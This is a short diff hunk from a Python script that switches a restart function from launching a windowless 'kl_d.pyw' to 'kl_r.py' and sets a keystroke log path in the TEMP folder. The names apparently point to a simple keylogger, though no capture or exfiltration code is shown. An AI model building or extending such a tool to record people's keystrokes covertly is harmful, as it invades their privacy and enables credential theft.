@@ -17,8 +17,8 @@ finally:
 
 def restartAPP():
 	print(os.getcwd())
-	# os.startfile("kl_r.py")
-	os.startfile("kl_d.pyw")
+	os.startfile("kl_r.py")
+# 	os.startfile("kl_d.pyw")
 
 keys = []
 logPATH = os.getenv('TEMP') + '\\log.txt'
